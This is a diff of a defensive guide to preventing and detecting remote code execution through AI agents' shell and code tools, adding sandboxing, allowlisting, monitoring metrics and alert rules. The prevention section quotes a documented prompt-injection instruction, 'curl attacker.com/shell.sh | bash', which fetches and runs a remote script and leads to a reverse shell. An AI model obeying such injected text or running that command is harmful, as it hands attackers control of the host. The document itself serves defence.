@@ -65,20 +65,35 @@ From Security Research (2026):
 - Shell tools with broad permissions
 - Code execution tools without sandboxing
 
-**Mitigation Strategies**
-1. **Input sanitization**: Treat all agent outputs as untrusted
-2. **Tool sandboxing**: Run tools in isolated containers
-3. **Allowlist commands**: Only permit specific safe commands
-4. **Remove shell access**: Eliminate direct shell tools where possible
-5. **Principle of least privilege**: Tools run with minimal permissions
-6. **Output validation**: Verify tool outputs before returning to agent
+## Mitigation Strategies
 
-**Detection**
-- Monitor for unusual command patterns
-- Alert on shell metacharacters in tool calls
-- Track process creation from agent processes
-- Log all tool executions with full parameters
-- Watch for network connections from tool processes
+### Prevention
+1. **Treat agent-generated tool parameters as untrusted input requiring full sanitization**: Apply the same input-validation discipline to agent-produced shell/code parameters that a web application applies to user-supplied form data — parameterized execution, no string concatenation into shell commands — since the root cause is that tool implementations were "designed for trusted human callers" and don't sanitize inputs coming from the AI model. Trade-off: strict parameterization limits the flexibility of what the agent can express through a tool, sometimes requiring more tool-specific parameters instead of a single freeform command string.
+2. **Command allowlisting instead of a general-purpose shell tool**: Replace broad `shell_execute()`-style tools with a fixed set of narrowly-scoped, parameterized operations (e.g., "list files," "run linter") so that even a successful prompt injection like the documented "curl attacker.com/shell.sh | bash" instruction has no matching allowlisted command to exploit. Trade-off: reduces the agent's ability to handle novel tasks that a general shell could accomplish, requiring the allowlist to be extended deliberately as new legitimate needs arise.
+3. **Sandboxed, network-isolated code/command execution**: Run any code-execution or shell tool inside a container/VM with no default network egress and a read-only or ephemeral filesystem, so that even if the agent is tricked into executing an attacker's payload (as in the CVE-2026-25592 case), the "curl | bash" pattern has no path to reach the internet or persist a reverse shell. Trade-off: sandboxing adds infrastructure complexity and latency, and tasks that legitimately need network access (e.g., installing a package) require explicit, audited exceptions.
+
+### Detection & Response
+1. **Shell-metacharacter and command-injection pattern scanning on tool calls**: Scan every shell/code-execution tool call for metacharacters (`;`, `|`, backticks) and known injection patterns (deserialization gadgets, template injection syntax) before execution, blocking calls that match, since the RCE Patterns table shows these are the concrete mechanisms across all five documented pattern types.
+2. **Process and network-connection monitoring from tool execution contexts**: Monitor for unexpected child-process spawning and outbound network connections originating from tool execution sandboxes, since the documented attack chain ends in "reverse shell established" — a network connection is the observable signal that the exploit succeeded even if the initial command scan missed it.
+3. **Full-parameter tool execution logging with replay capability**: Log every tool execution with its complete parameters (not truncated/summarized) so that when a compromise is suspected, the exact command or code that ran can be reconstructed and the injected instruction traced back to its source document or prompt.
+
+### Architecture Patterns
+1. **Isolated-container tool execution with per-call ephemeral environments**: Architect tool execution so each shell/code call runs in a freshly-provisioned, ephemeral container destroyed immediately after the call completes, structurally preventing any persistence mechanism (reverse shell, dropped script) from surviving beyond a single tool invocation.
+2. **Capability-scoped tool interfaces replacing general shell access**: Replace direct shell/code-execution tools with a capability-based interface exposing only specific, safe operations (file read within a scoped directory, specific CLI subcommands), eliminating the "shell tools with broad permissions" contributing factor at the architecture level rather than relying on runtime filtering.
+3. **Output-validation gateway between tool execution and agent context**: Insert a validation layer that inspects tool execution results before they re-enter the agent's context, verifying the output matches the expected shape/type for that tool, so that even a compromised tool cannot smuggle further attacker-controlled instructions back into the agent's next reasoning step.
+
+### Metrics
+1. **shell_metacharacter_block_rate**: Target: track as baseline, trending toward 0 successful executions; Alert on any tool call containing shell metacharacters that bypasses the scanner
+2. **tool_call_allowlist_violation_rate**: Target: 0% of executed commands fall outside the allowlisted command set; Alert on any attempted non-allowlisted execution
+3. **sandbox_network_egress_attempts**: Target: 0 outbound connections from execution sandboxes without an explicit exception; Alert on any egress attempt
+4. **unexpected_child_process_rate**: Target: 0 child processes spawned outside the declared tool operation; Alert on any anomalous process creation
+
+### Alerts
+1. **Injection Pattern Matched in Tool Call** (P1): Condition - a shell/code-execution tool call contains a known command-injection, deserialization, or template-injection pattern. Action: Block execution immediately, quarantine the session, trace the injected instruction back to its source document/context.
+2. **Unexpected Outbound Connection from Sandbox** (P1): Condition - a tool execution sandbox initiates a network connection not explicitly authorized for that task. Action: Kill the sandbox container immediately, treat as confirmed RCE, rotate any credentials accessible from that execution context.
+3. **Tool Executed Outside Allowlist** (P2): Condition - a tool call attempts an operation not in the pre-approved command/capability allowlist. Action: Block the call, log the attempted command and originating prompt content, review whether the allowlist needs deliberate extension or the prompt indicates an attack.
+
+## References
 
 ## References
 
